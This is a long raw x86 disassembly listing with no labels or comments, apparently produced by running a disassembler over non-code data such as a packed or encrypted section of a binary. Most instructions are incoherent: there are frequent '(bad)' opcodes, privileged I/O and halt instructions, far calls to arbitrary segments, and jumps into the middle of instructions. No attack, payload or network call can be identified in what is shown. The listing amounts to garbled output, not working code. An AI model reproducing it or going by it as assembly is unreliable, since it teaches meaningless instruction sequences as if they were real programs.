  421ccf:	mov    BYTE PTR [esi*1+0x7af571f7],bl
  421cd6:	sub    DWORD PTR [ecx-0x46919d5a],ebp
  421cdc:	in     al,0x8e
  421cde:	pop    ss
  421cdf:	fadd   DWORD PTR [eax+0x68c3a129]
  421ce5:	outs   dx,BYTE PTR ds:[esi]
  421ce6:	sub    al,0x3d
  421ce8:	xor    ch,BYTE PTR [eax-0x68]
  421ceb:	loop   0x421cbd
  421ced:	cdq    
  421cee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cef:	xor    eax,esp
  421cf1:	inc    ebx
  421cf2:	daa    
  421cf3:	scas   eax,DWORD PTR es:[edi]
  421cf4:	(bad)  
  421cf6:	jbe    0x421ca1
  421cf8:	push   ebp
  421cf9:	sbb    ch,dl
  421cfb:	mov    bl,0x6d
  421cfd:	icebp  
  421cfe:	inc    eax
  421cff:	(bad)  
  421d00:	jno    0x421cf7
  421d02:	add    BYTE PTR [ecx],dl
  421d04:	sbb    eax,0xc92411db
  421d09:	pop    edi
  421d0a:	mov    ss,WORD PTR [ecx+ebx*4]
  421d0d:	sbb    eax,0x7c064b29
  421d12:	add    DWORD PTR [ecx-0x5f],0x6
  421d16:	inc    esp
  421d17:	and    dh,BYTE PTR [eax-0x55]
  421d1a:	pop    ecx
  421d1b:	hlt    
  421d1c:	add    eax,0xbe6c863
  421d21:	pop    ecx
  421d22:	call   0x751c:0x712d81ea
  421d29:	pop    ebx
  421d2a:	push   cs
  421d2b:	dec    edi
  421d2c:	outs   dx,BYTE PTR ds:[esi]
  421d2d:	jp     0x421d6e
  421d2f:	push   0xeb64d8bc
  421d34:	push   edx
  421d35:	ror    BYTE PTR [eax],1
  421d37:	ret    0x4f1a
  421d3a:	in     al,dx
  421d3b:	imul   DWORD PTR [edi-0x39c451c8]
  421d41:	cs and al,0xba
  421d44:	popf   
  421d45:	repz fld DWORD PTR [edx]
  421d48:	retf   0xe4cf
  421d4b:	cs dec edx
  421d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d4e:	mov    dl,0x66
  421d50:	push   ebp
  421d51:	jmp    0x421d80
  421d53:	cs mov cl,0x91
  421d56:	int3   
  421d57:	gs adc eax,0xc60fa963
  421d5d:	push   0x45
  421d5f:	push   eax
  421d60:	push   ss
  421d61:	push   eax
  421d62:	dec    edx
  421d63:	mov    ch,0xb4
  421d65:	stc    
  421d66:	mov    bh,0x7f
  421d68:	lahf   
  421d69:	adc    al,0x79
  421d6b:	add    eax,0x5a66f723
  421d70:	cld    
  421d71:	into   
  421d72:	mov    ds:0x2759fae4,al
  421d77:	sti    
  421d78:	ret    
  421d79:	sti    
  421d7a:	add    bh,BYTE PTR [eax]
  421d7c:	ja     0x421daa
  421d7e:	ror    al,1
  421d80:	rcl    DWORD PTR [esp+ebp*2],cl
  421d83:	jl     0x421e04
  421d85:	ret    0x86e
  421d88:	sub    al,0x1d
  421d8a:	fistp  QWORD PTR [eax]
  421d8c:	xchg   edx,eax
  421d8d:	xor    ch,dl
  421d8f:	aam    0x85
  421d91:	and    esp,DWORD PTR [ebx-0x14d013c6]
  421d97:	adc    DWORD PTR [eax],edi
  421d99:	pop    ecx
  421d9a:	push   cs
  421d9b:	nop
  421d9c:	jmp    0x421d86
  421d9e:	mov    bl,0x40
  421da0:	xchg   ecx,eax
  421da1:	je     0x421d59
  421da3:	jmp    FWORD PTR [eax-0x4d]
  421da6:	aaa    
  421da7:	xchg   esi,eax
  421da8:	dec    ebp
  421da9:	and    eax,0xd9a21d85
  421dae:	les    esp,FWORD PTR [eax+edi*4-0x2a]
  421db2:	mov    esi,0x716e00f9
  421db7:	(bad)  
  421db8:	adc    al,0xcf
  421dba:	jb     0x421d66
  421dbc:	not    dl
  421dbe:	mov    ds:0x7ca0a6b6,eax
  421dc3:	mov    eax,ds:0xd214b862
  421dc8:	jp     0x421d4f
  421dca:	shl    BYTE PTR ds:0x2e15372,cl
  421dd0:	and    BYTE PTR [edx+ebp*8],0xc5
  421dd4:	pop    esp
  421dd5:	mov    ?,WORD PTR [ecx]
  421dd7:	pop    eax
  421dd8:	iret   
  421dd9:	add    al,0xf3
  421ddb:	test   al,0xff
  421ddd:	shl    DWORD PTR [eax-0x443b2719],1
  421de3:	add    ah,BYTE PTR [eax]
  421de5:	jns    0x421e44
  421de7:	xor    eax,0xc7fbc9f0
  421dec:	sub    DWORD PTR [esi],esp
  421dee:	stos   BYTE PTR es:[edi],al
  421def:	jo     0x421e17
  421df1:	adc    BYTE PTR [ecx],0xc
  421df4:	aaa    
  421df5:	jnp    0x421e23
  421df7:	sub    DWORD PTR [edx-0x4896da79],ecx
  421dfd:	shl    DWORD PTR [ecx-0x4a],0x9d
  421e01:	mov    bh,0xc0
  421e03:	pop    ebx
  421e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421e05:	inc    eax
  421e06:	or     edx,DWORD PTR [edi-0x52350f55]
  421e0c:	ins    BYTE PTR es:[edi],dx
  421e0d:	and    eax,0x8b81b73e
  421e12:	cwde   
  421e13:	out    0x37,al
  421e15:	mov    dh,BYTE PTR [edi-0x7268381e]
  421e1b:	xchg   ebx,eax
  421e1c:	pop    ss
  421e1d:	push   0xaf6955d5
  421e22:	or     DWORD PTR [ecx],ebx
  421e24:	retf   
  421e25:	pop    ebx
  421e26:	mov    edx,0xc334d392
  421e2b:	es adc al,0x11
  421e2e:	out    dx,al
  421e2f:	mov    ah,0x6e
  421e31:	in     eax,dx
  421e32:	inc    edi
  421e33:	or     ah,BYTE PTR [ebp-0x6f520263]
  421e39:	retf   0x5ce8
  421e3c:	mov    eax,0x59bab24e
  421e41:	jecxz  0x421e4d
  421e43:	jp     0x421e46
  421e45:	test   dh,dl
  421e47:	outs   dx,BYTE PTR ds:[esi]
  421e48:	push   eax
  421e49:	dec    ebp
  421e4a:	(bad)  
  421e4b:	shr    DWORD PTR [edx-0x23],cl
  421e4e:	xor    esp,eax
  421e50:	hlt    
  421e51:	pusha  
  421e52:	int    0xa0
  421e54:	lds    esi,FWORD PTR [esi+0x3d615635]
  421e5a:	and    al,0x58
  421e5c:	jne    0x421e68
  421e5e:	cmp    DWORD PTR [edx-0x50222289],esp
  421e64:	cmp    dl,dl
  421e66:	sbb    BYTE PTR [edi+ecx*8],dh
  421e69:	mov    dh,BYTE PTR [edx]
  421e6b:	inc    esi
  421e6c:	sub    eax,0x98321448
  421e71:	pop    ecx
  421e72:	cmp    BYTE PTR [eax+0x219e378b],bh
  421e78:	adc    eax,0x71ab591c
  421e7d:	lds    ecx,FWORD PTR [ebx+edi*1+0x2eff86b5]
  421e84:	loope  0x421e66
  421e86:	push   ebx
  421e87:	pop    edi
  421e88:	test   eax,edx
  421e8a:	and    cl,BYTE PTR [eax]
  421e8c:	in     eax,dx
  421e8d:	sbb    dh,dh
  421e8f:	add    al,0xf3
  421e91:	fwait
  421e92:	aaa    
  421e93:	fwait
  421e94:	cmp    eax,0xa014a927
  421e99:	rol    DWORD PTR [ecx-0x28],cl
  421e9c:	add    cl,ah
  421e9e:	dec    edx
  421e9f:	(bad)  
  421ea0:	inc    eax
  421ea1:	jbe    0x421f0d
  421ea3:	mov    al,ah
  421ea5:	or     ebx,DWORD PTR [eax]
  421ea7:	xchg   edi,eax
  421ea8:	loop   0x421e3e
  421eaa:	dec    ebp
  421eab:	fnstcw WORD PTR [esi+0x4f]
  421eae:	ret    0xa378
  421eb1:	add    BYTE PTR [edi],al
  421eb3:	dec    esp
  421eb4:	nop
  421eb5:	mov    esp,ecx
  421eb7:	mov    edi,0x6161c5fc
  421ebc:	sub    ecx,ebx
  421ebe:	push   0x6953c62
  421ec3:	in     al,0x31
  421ec5:	dec    ebx
  421ec6:	sbb    dl,cl
  421ec8:	cmp    ebp,esp
  421eca:	push   esp
  421ecb:	dec    edi
  421ecc:	lea    eax,[ebx+0x58]
  421ecf:	dec    edx
  421ed0:	add    DWORD PTR [edx],ebp
  421ed2:	bound  ebx,QWORD PTR [edx-0x4c]
  421ed5:	fiadd  WORD PTR [ebx+0x1f]
  421ed8:	in     al,0x3b
  421eda:	mov    edi,0x53c868ef
  421edf:	into   
  421ee0:	mov    cl,0x95
  421ee2:	mov    BYTE PTR [ebx],dl
  421ee4:	push   esp
  421ee5:	sub    BYTE PTR [edx-0x600b8a6c],bl
  421eeb:	(bad)  
  421eec:	stos   BYTE PTR es:[edi],al
  421eed:	jnp    0x421f24
  421eef:	push   ecx
  421ef0:	adc    BYTE PTR [esi+edi*2-0x15],bh
  421ef4:	test   DWORD PTR [edx+0x62],0x796a1764
  421efb:	enter  0x44ea,0x2c
  421eff:	pusha  
  421f00:	ret    
  421f01:	imul   esp,DWORD PTR [edi-0x12225d3c],0xffffffe1
  421f08:	sbb    DWORD PTR [esi],0x0
  421f0b:	pop    ds
  421f0c:	adc    DWORD PTR [esi+0x4b2e6c0d],esi
  421f12:	arpl   si,ax
  421f14:	test   al,0xa8
  421f16:	mov    dh,dl
  421f18:	jl     0x421f09
  421f1a:	addr16 jmp 0x421f54
  421f1d:	nop
  421f1e:	pusha  
  421f1f:	add    al,dl
  421f21:	das    
  421f22:	neg    BYTE PTR [ebx-0x8b362ba]
  421f28:	push   eax
  421f29:	sbb    BYTE PTR [edx+0x60b1ac0e],cl
  421f2f:	sub    BYTE PTR [ecx+0x17],bl
  421f32:	or     eax,0x47ff3690
  421f37:	stc    
  421f38:	xor    edx,DWORD PTR [eax]
  421f3a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421f3b:	cs inc ebx
  421f3d:	and    eax,0xd4d68693
  421f42:	adc    dl,BYTE PTR [eax+0x19]
  421f45:	add    bh,BYTE PTR [ebp+0x1b173c99]
  421f4b:	mov    esi,DWORD PTR [edi+0x71]
  421f4e:	popf   
  421f4f:	sub    al,0xd5
  421f51:	jbe    0x421f8e
  421f53:	fistp  QWORD PTR [bp+di+0x5a]
  421f57:	add    DWORD PTR [ebx+0x2a313aed],ebx
  421f5d:	push   esi
  421f5e:	stc    
  421f5f:	mov    BYTE PTR [ecx+0x42],0x18
  421f63:	mov    edx,0xcd10a6
  421f68:	btc    DWORD PTR ds:0x30171485,esp
  421f6f:	xchg   edi,eax
  421f70:	idiv   BYTE PTR [esp+ecx*1-0x2cc77f7a]
  421f77:	not    ah
  421f79:	and    DWORD PTR [ebx],ebx
  421f7b:	fmul   QWORD PTR ss:[esi-0x3c42c32]
  421f82:	mul    dl
  421f84:	mov    eax,ds:0xe2066e7f
  421f89:	dec    ebx
  421f8a:	jo     0x421f1f
  421f8c:	enter  0x3179,0x54
  421f90:	idiv   esp
  421f92:	pop    edi
  421f93:	mov    ds:0x8bfb4239,al
  421f98:	jae    0x421f1c
  421f9a:	and    al,0xc7
  421f9c:	dec    esi
  421f9d:	addr16 in al,0x6d
  421fa0:	imul   esp,DWORD PTR [esi-0x7277a826],0x32ba02
  421faa:	frstor [esi+0x4a]
  421fad:	xchg   BYTE PTR [eax+0x236da193],bl
  421fb3:	mov    eax,0x48fa8917
  421fb8:	lahf   
  421fb9:	sbb    BYTE PTR [eiz*4-0x409408f5],ch
  421fc0:	test   ch,0xea
  421fc3:	cld    
  421fc4:	push   0xba72c86a
  421fc9:	xchg   edi,eax
  421fca:	xchg   ecx,eax
  421fcb:	pop    ebp
  421fcc:	add    BYTE PTR [edx],0xcc
  421fcf:	jge    0x421f92
  421fd1:	dec    edx
  421fd2:	popa   
  421fd3:	sub    al,0x93
  421fd5:	scas   al,BYTE PTR es:[edi]
  421fd6:	cmp    ebx,DWORD PTR [ecx+0x33]
  421fd9:	inc    eax
  421fda:	adc    DWORD PTR [esp+ebx*8-0x20],0xfffffff3
  421fdf:	(bad)
  421fe4:	or     eax,0x64df300e
  421fe9:	fdivr  QWORD PTR [esi]
  421feb:	test   al,0xbf
  421fed:	sub    al,BYTE PTR [edi]
  421fef:	je     0x421fb5
  421ff1:	outs   dx,DWORD PTR ds:[esi]
  421ff2:	push   es
  421ff3:	mov    dl,0x3e
  421ff5:	and    al,0xbb
  421ff7:	retf   0x38ce
  421ffa:	pop    ds
  421ffb:	dec    ebp
  421ffc:	jp     0x421fba
  421ffe:	retf   0xe411
  422001:	jnp    0x421fcd
  422003:	jb     0x421fcf
  422005:	adc    bh,dl
  422007:	add    al,BYTE PTR [edi-0x687d7a9c]
  42200d:	sbb    eax,0xc916bdcf
  422012:	mov    es:0xad64e772,eax
  422018:	cmp    BYTE PTR [edx-0xb],dl
  42201b:	sbb    BYTE PTR [esi-0x2989075],cl
  422021:	push   ss
  422022:	ret    
  422023:	loope  0x42208f
  422025:	push   eax
  422026:	icebp  
  422027:	js     0x421fc4
  422029:	cmp    BYTE PTR [ebx],ah
  42202b:	cdq    
  42202c:	inc    edx
  42202d:	pop    edi
  42202e:	mov    al,0x94
  422030:	aaa    
  422031:	push   0x6623e61c
  422036:	xlat   BYTE PTR ds:[ebx]
  422037:	lds    edx,FWORD PTR [ebx+0x2725230b]
  42203d:	retf   0xd004
  422040:	sahf   
  422041:	mov    bh,0xbe
  422043:	inc    eax
  422044:	sbb    ah,bl
  422046:	adc    DWORD PTR [ebx-0x2b],edx
  422049:	in     al,0x5
  42204b:	jbe    0x42208b
  42204d:	dec    eax
  42204e:	call   0xea22:0x93ac8afe
  422055:	jecxz  0x42202d
  422057:	pop    edi
  422058:	stos   DWORD PTR es:[edi],eax
  422059:	xchg   cl,dl
  42205b:	mov    ds:0x5d31ae55,eax
  422060:	mov    eax,ds:0xfd590652
  422065:	test   BYTE PTR gs:[edi],0xac
  422069:	inc    edx
  42206a:	popa   
  42206b:	add    eax,0x70247cc0
  422070:	jns    0x422078
  422072:	(bad)
  422075:	aam    0xf1
  422077:	inc    edx
  422078:	push   edx
  422079:	aam    0x66
  42207b:	jne    0x422016
  42207d:	push   ebx
  42207e:	dec    eax
  42207f:	shl    BYTE PTR [eax+0x222e515],0x64
  422086:	ins    BYTE PTR es:[edi],dx
  422087:	das    
  422088:	mov    bh,ah
  42208a:	push   edi
  42208b:	dec    BYTE PTR [eax]
  42208d:	aas    
  42208e:	push   edx
  42208f:	imul   ebx,ecx,0xffffffa2
  422092:	ss push esp
  422094:	(bad)  
  422095:	call   0x9713:0x3eaeda1a
  42209c:	mov    ebx,0xf3318b39
  4220a1:	inc    edi
  4220a2:	aam    0x79
  4220a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4220a5:	das    
  4220a6:	nop
  4220a7:	xor    ah,BYTE PTR [eax-0x1853ff5e]
  4220ad:	out    0xee,eax
  4220af:	push   edi
  4220b0:	data16 adc al,BYTE PTR [ecx+0x4e9b2168]
  4220b7:	sti    
  4220b8:	xor    al,0x76
  4220ba:	fnstsw WORD PTR [ecx]
  4220bc:	neg    BYTE PTR [eax-0x18]
  4220bf:	cmp    al,0x64
  4220c1:	xchg   ebp,eax
  4220c2:	and    al,0xf1
  4220c4:	neg    DWORD PTR [edx-0x57df922e]
  4220ca:	dec    ebp
  4220cb:	loopne 0x4220af
  4220cd:	jp     0x422089
  4220cf:	sub    al,0x9
  4220d1:	(bad)  
  4220d2:	inc    eax
  4220d3:	call   FWORD PTR [eax-0x2e]
  4220d6:	mov    BYTE PTR [eax],bl
  4220d8:	inc    edx
  4220d9:	adc    cl,BYTE PTR [esp+ebx*2]
  4220dc:	sub    esi,DWORD PTR [ebp+eiz*2-0x14]
  4220e0:	shl    BYTE PTR [ecx],1
  4220e2:	arpl   WORD PTR [esi],dx
  4220e4:	jge    0x42208c
  4220e6:	into   
  4220e7:	and    al,cl
  4220e9:	pop    ds
  4220ea:	(bad)  
  4220eb:	popf   
  4220ec:	sub    eax,0x2acbf505
  4220f1:	adc    dh,bh
  4220f3:	mov    dh,0x2c
  4220f5:	idiv   BYTE PTR [edx]
  4220f7:	mov    edi,0x50ba750e
  4220fc:	pop    esp
  4220fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4220fe:	ret    
  4220ff:	push   eax
  422100:	mov    ebp,ebx
  422102:	mov    ds:0xb21a7749,eax
  422107:	(bad)  
  422108:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422109:	fsubr  DWORD PTR es:[esi+ebx*1+0x11]
  42210e:	jp     0x42209a
  422110:	sub    bl,BYTE PTR [edx+ebp*1+0x63]
  422114:	aam    0x8c
  422116:	push   ebx
  422117:	into   
  422118:	adc    edi,esi
  42211a:	xor    cl,BYTE PTR [esp+eiz*8]
  42211d:	mov    WORD PTR [eax+0x1d44cac4],fs
  422123:	(bad)  
  422124:	xor    BYTE PTR [esi],ch
  422126:	ins    DWORD PTR es:[edi],dx
  422127:	out    dx,al
  422128:	xchg   ebp,eax
  422129:	jmp    0x7ed5:0x763688c9
  422130:	xchg   DWORD PTR [ebx-0x2d],eax
  422133:	mov    cl,0x8b
  422135:	cs dec eax
  422137:	ror    DWORD PTR [ebx],1
  422139:	fcmovnb st,st(6)
  42213b:	addr16 (bad) 
  42213d:	mov    al,0xa3
  42213f:	mov    DWORD PTR [eax+0x52776eb3],edi
  422145:	pop    ecx
  422146:	and    BYTE PTR [esp+eax*2-0x6e8e941b],dl
  42214d:	iret   
  42214e:	lea    ecx,[ebp-0x22]
  422151:	inc    ecx
  422152:	xor    al,0x4
  422154:	fsub   st(4),st
  422156:	fidiv  WORD PTR [ebx+esi*2+0x46]
  42215a:	scas   al,BYTE PTR es:[edi]
  42215b:	loopne 0x422158
  42215d:	pushf  
  42215e:	or     BYTE PTR [ebp-0x25],ah
  422161:	pop    es
  422162:	hlt    
  422163:	imul   eax,DWORD PTR [esi],0x60
  422166:	inc    ecx
  422167:	fdivr  DWORD PTR [esi-0xa6e492]
  42216d:	div    BYTE PTR [esi]
  42216f:	pop    edx
  422170:	cld    
  422171:	mov    ecx,0x4666edf3
  422176:	ja     0x422196
  422178:	ja     0x4221e2
  42217a:	push   es
  42217b:	push   ebp
  42217c:	fist   DWORD PTR [edx-0x17]
  42217f:	(bad)  
  422180:	lahf   
  422181:	cs add al,0xad
  422184:	es ins BYTE PTR es:[edi],dx
  422186:	test   al,0x37
  422188:	lds    ecx,FWORD PTR [edi-0x2f]
  42218b:	jns    0x422155
  42218d:	syscall 
  42218f:	cmp    eax,0xdf4262be
  422194:	cmp    DWORD PTR [ecx+esi*4+0x50],edi
  422198:	and    al,0x6
  42219a:	jge    0x4221e5
  42219c:	mov    ds:0x13e33929,eax
  4221a1:	cmp    BYTE PTR [ebp+0x2614d62],bh
  4221a7:	fsub   st(7),st
  4221a9:	ret    0x5bc8
  4221ac:	retf   
  4221ad:	inc    eax
  4221ae:	sub    dl,BYTE PTR [ebx+0x6]
  4221b1:	mov    ds:0x825edd3,al
  4221b6:	jmp    0x5d37:0x2025e7f5
  4221bd:	and    al,0x69
  4221bf:	loopne 0x4221fb
  4221c1:	mov    ebx,0xb9f0f665
  4221c6:	pusha  
  4221c7:	mov    edi,esp
  4221c9:	fistp  QWORD PTR [ebp+eax*2+0x5e933110]
  4221d0:	sub    DWORD PTR [edi-0xb],ebx
  4221d3:	cdq    
  4221d4:	inc    ebx
  4221d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221d6:	and    al,0x77
  4221d8:	jno    0x4221be
  4221da:	mov    cl,0xf9
  4221dc:	scas   al,BYTE PTR es:[edi]
  4221dd:	push   esi
  4221de:	das    
  4221df:	mov    ds:0x769a120f,al
  4221e4:	and    cl,BYTE PTR [ecx+0x2c]
  4221e7:	add    BYTE PTR [ecx-0x7a8e795],ah
  4221ed:	fs and DWORD PTR fs:[ebx+ebp*8+0x5],esi
  4221f3:	call   0x90ef:0xbfe984c0
  4221fa:	jnp    0x42219a
  4221fc:	sub    eax,0x14e7a1b5
  422201:	ins    DWORD PTR es:[edi],dx
  422202:	shr    BYTE PTR [edi],cl
  422204:	jb     0x422224
  422206:	xchg   ecx,eax
  422207:	cli    
  422208:	push   ebx
  422209:	in     al,dx
  42220a:	sbb    bl,al
  42220c:	imul   eax,DWORD PTR [edi],0xd4f5c61e
  422212:	out    0x55,al
  422214:	outs   dx,BYTE PTR ds:[esi]
  422215:	push   0x75
  422217:	aam    0x1e
  422219:	mov    al,ds:0x11420d5c
  42221e:	mov    al,ds:0x1be6b990
  422223:	fs mov al,0x25
  422226:	imul   eax,DWORD PTR [edi-0x24],0xffffffe9
  42222a:	cmp    esp,edx
  42222c:	jmp    0x733f4fda
  422231:	aam    0x9d
  422233:	mov    WORD PTR ds:0xa7103624,?
  422239:	mov    fs,WORD PTR [edx+0x3f5afe2d]
  42223f:	xchg   ebp,eax
  422240:	(bad)  
  422241:	sahf   
  422242:	outs   dx,DWORD PTR ds:[esi]
  422243:	push   ss
  422244:	and    DWORD PTR [ebx],ebx
  422246:	lds    esp,FWORD PTR [ecx-0x38]
  422249:	adc    bl,BYTE PTR [edi+0x47d0c27c]
  42224f:	sbb    ecx,DWORD PTR [edx-0x53ffb1a0]
  422255:	add    bl,BYTE PTR [esi+0x68]
  422258:	int3   
  422259:	ins    BYTE PTR es:[edi],dx
  42225a:	jno    0x422250
  42225c:	add    DWORD PTR [ebp-0x3b],0x2b3f486e
  422263:	adc    BYTE PTR [edi],dl
  422265:	call   0xe00d318
  42226a:	shl    BYTE PTR [edi+0x1f5badbe],0xcc
  422271:	sub    dl,bh
  422273:	les    ebx,FWORD PTR [ebx-0x31]
  422276:	repz jge 0x422247
  422279:	popa   
  42227a:	xor    BYTE PTR ds:0x85b58515,ch
  422280:	adc    ebp,DWORD PTR [eax+0x471c529c]
  422286:	nop
  422287:	mov    BYTE PTR [edx+0x4e],ah
  42228a:	sti    
  42228b:	ins    BYTE PTR es:[edi],dx
  42228c:	leave  
  42228d:	std    
  42228e:	dec    ecx
  42228f:	pop    ebx
  422290:	or     dh,BYTE PTR [eax-0xed47a13]
  422296:	mov    eax,ds:0xecd0b333
  42229b:	lods   eax,DWORD PTR ds:[esi]
  42229c:	jmp    0x2af4:0x6315c224
  4222a3:	sahf   
  4222a4:	push   esi
  4222a5:	mov    bh,ah
  4222a7:	xchg   ebp,eax
  4222a8:	fisub  WORD PTR [edi-0x31]
  4222ab:	jge    0x422315
  4222ad:	ret    0xa763
  4222b0:	xchg   esi,eax
  4222b1:	lahf   
  4222b2:	(bad)  
  4222b3:	adc    dh,BYTE PTR [eax]
  4222b5:	pop    ebx
  4222b6:	int    0x7a
  4222b8:	dec    esi
  4222b9:	ret    0x2bc1
  4222bc:	mov    edi,0x8c150fab
  4222c1:	push   ebx
  4222c2:	mov    ds:0xf2680429,al
  4222c7:	push   0xffffffcc
  4222c9:	addr16 and al,0xa
  4222cc:	or     al,0xf4
  4222ce:	adc    edi,DWORD PTR [edi]
  4222d0:	push   ecx
  4222d1:	inc    ecx
  4222d2:	out    dx,eax
  4222d3:	aad    0xa4
  4222d5:	iret   
  4222d6:	ret    
  4222d7:	push   esp
  4222d8:	data16 lahf 
  4222da:	outs   dx,DWORD PTR ds:[esi]
  4222db:	pushf  
  4222dc:	dec    esi
  4222dd:	imul   eax,DWORD PTR [edx-0x1f],0x7f
  4222e1:	fild   WORD PTR [edx-0x524c10dc]
  4222e7:	sub    cl,BYTE PTR [eax-0x4e]
  4222ea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4222eb:	mov    cl,0x51
  4222ed:	jle    0x42233f
  4222ef:	dec    esp
  4222f0:	mov    dh,0xf1
  4222f2:	gs (bad) 
  4222f4:	in     eax,0x34
  4222f6:	jno    0x42227b
  4222f8:	inc    edx
  4222f9:	add    ebp,DWORD PTR [eax+0x6c]
  4222fc:	gs mov dh,0x4e
  4222ff:	pop    es
  422300:	loope  0x422283
  422302:	mov    eax,ds:0x82cc4da0
  422307:	test   BYTE PTR [eax],bh
  422309:	mov    BYTE PTR ds:0xb94e9c04,cl
  42230f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422310:	daa    
  422311:	iret   
  422312:	pop    ebx
  422313:	or     dl,bl
  422315:	ror    DWORD PTR [ebp+edi*4+0x6],1
  422319:	mov    dh,0xe9
  42231b:	popf   
  42231c:	or     ah,BYTE PTR [eax+eax*2]
  42231f:	mov    dl,0x8a
  422321:	int3   
  422322:	fcmovnb st,st(3)
  422324:	fldenv [ebx]
  422326:	es mov esp,0x3db8f41
  42232c:	add    DWORD PTR [ebp-0x12],esp
  42232f:	popf   
  422330:	fs popf 
  422332:	jns    0x4222c3
  422334:	pop    ds
  422335:	fwait
  422336:	add    al,0x87
  422338:	add    ecx,esp
  42233a:	pushf  
  42233b:	xor    al,0xb5
  42233d:	rcr    BYTE PTR [eax-0x4d80d9d1],cl
  422343:	xor    ch,al
  422345:	and    al,0xa5
  422347:	jne    0x4222ca
  422349:	mov    ebx,0x5961f757
  42234e:	sbb    ebp,DWORD PTR [ebx-0x418b97fe]
  422354:	stc    
  422355:	popa   
  422356:	cwde   
  422357:	ins    DWORD PTR es:[edi],dx
  422358:	aad    0x44
  42235a:	loopne 0x422309
  42235c:	adc    ebp,eax
  42235e:	add    al,0x9f
  422360:	call   0xb527ee92
  422365:	cmc    
  422366:	mov    al,0x62
  422368:	out    0x28,eax
  42236a:	sbb    al,0xbe
  42236c:	ffreep st(1)
  42236e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42236f:	sub    eax,edi
  422371:	dec    edx
  422372:	pop    esi
  422373:	add    al,0xb2
  422375:	(bad)  
  422376:	(bad)  
  422378:	mov    esp,0x319f9541
  42237d:	dec    esi
  42237e:	invd   
  422380:	leave  
  422381:	and    WORD PTR es:[ebp+edx*2-0x5d19bbb8],cx
  42238a:	cmp    DWORD PTR [esi-0x2b48f012],edx
  422390:	hlt    
  422391:	pop    eax
  422392:	jecxz  0x4223d6
  422394:	sbb    BYTE PTR [eax+ebx*1+0x5be6a626],0xd6
  42239c:	lahf   
  42239d:	mov    esi,DWORD PTR [ebx-0x23]
  4223a0:	mov    bl,0xae
  4223a2:	es pop ebp
  4223a4:	call   0x4385:0x9931ffe7
  4223ab:	xor    edi,DWORD PTR [edx]
  4223ad:	pop    ebp
  4223ae:	icebp  
  4223af:	pop    ebp
  4223b0:	push   es
  4223b1:	sub    ecx,DWORD PTR [edx-0xb01abc2]
  4223b7:	push   ebx
  4223b8:	rcr    eax,0x3b
  4223bb:	into   
  4223bc:	cwde   
  4223bd:	cmp    DWORD PTR [edi+ecx*1],esi
  4223c0:	and    dl,dh
  4223c2:	scas   al,BYTE PTR es:[edi]
  4223c3:	call   0xa4cc:0xf52cbdb3
  4223ca:	hlt    
  4223cb:	ror    BYTE PTR [edi],0xe0
  4223ce:	int    0xb4
  4223d0:	rcr    BYTE PTR cs:[ebp-0x643b84b1],0x27
  4223d8:	fsubr  st,st(1)
  4223da:	or     eax,0x7b58cbd6
  4223df:	or     esi,edx
  4223e1:	imul   edx,DWORD PTR [edi],0xe047cba0
  4223e7:	fsubr  DWORD PTR [eax-0x5ca43149]
  4223ed:	stos   BYTE PTR es:[edi],al
  4223ee:	xchg   ebx,eax
  4223ef:	ja     0x422404
  4223f1:	cdq    
  4223f2:	cmp    eax,edx
  4223f4:	mov    ah,0xc7
  4223f6:	gs pop es
  4223f8:	push   esi
  4223f9:	int3   
  4223fa:	mov    ebx,0x1a9818c7
  4223ff:	inc    esp
  422400:	shr    bh,0x51
  422403:	push   ss
  422404:	call   0x3d84f835
  422409:	scas   eax,DWORD PTR es:[edi]
  42240a:	stc    
  42240b:	and    DWORD PTR ds:0x53b9717,esp
  422411:	pop    esp
  422412:	rcr    DWORD PTR [esp+ebx*8],cl
  422415:	enter  0x70e3,0x53
  422419:	fsub   DWORD PTR ds:0x173758fe
  42241f:	push   ds
  422420:	scas   eax,DWORD PTR es:[edi]
  422421:	add    eax,DWORD PTR [eax]
  422423:	jno    0x422442
  422425:	mov    ecx,0x853daf85
  42242a:	fs inc edi
  42242c:	nop
  42242d:	xchg   edi,eax
  42242e:	call   0xe256:0xd00613d8
  422435:	jge    0x42242e
  422437:	mov    edx,esi
  422439:	dec    esi
  42243a:	ret    0xd08b
  42243d:	dec    esi
  42243e:	mov    ds:0x5cbdca9e,eax
  422443:	pop    ebx
  422444:	repnz or dl,BYTE PTR [ebp-0x6d]
  422448:	std    
  422449:	mov    esp,0xb51fb46e
  42244e:	push   edx
  42244f:	push   edi
  422450:	mov    al,ds:0x3080d91
  422455:	addr16 or eax,0x70093050
  42245b:	mov    ah,0x2a
  42245d:	lods   al,BYTE PTR ds:[esi]
  42245e:	or     al,0xc8
  422460:	ror    BYTE PTR [ebx],1
  422462:	fwait
  422463:	cmp    DWORD PTR [ebx-0x55f2a8df],edi
  422469:	out    0xbe,al
  42246b:	push   eax
  42246c:	clc    
  42246d:	mov    edi,0x41615637
  422472:	push   cs
  422473:	je     0x422477
  422475:	adc    BYTE PTR [ebp+0x3c5e0f2],ch
  42247b:	pusha  
  42247c:	rol    BYTE PTR [edx+0x4],0xe4
  422480:	bound  eax,QWORD PTR [eax+edi*1+0x79edc5b0]
  422487:	mov    edi,0x7a7148d9
  42248c:	cmp    al,0x78
  42248e:	pop    ecx
  42248f:	sbb    al,0x4a
  422491:	(bad)  
  422492:	push   ss
  422493:	sar    BYTE PTR [esi+0x55],1
  422496:	daa    
  422497:	daa    
  422498:	call   DWORD PTR [ebx-0x65d68b5b]
  42249e:	pop    ss
  42249f:	cld    
  4224a0:	add    al,0x62
  4224a2:	test   al,0xd4
  4224a4:	aaa    
  4224a5:	aaa    
  4224a6:	iret   
  4224a7:	std    
  4224a8:	lods   eax,DWORD PTR ds:[esi]
  4224a9:	mov    WORD PTR [esi+0x4f],ds
  4224ac:	sbb    bl,dh
  4224ae:	sbb    eax,DWORD PTR [edx-0x28ce9adb]
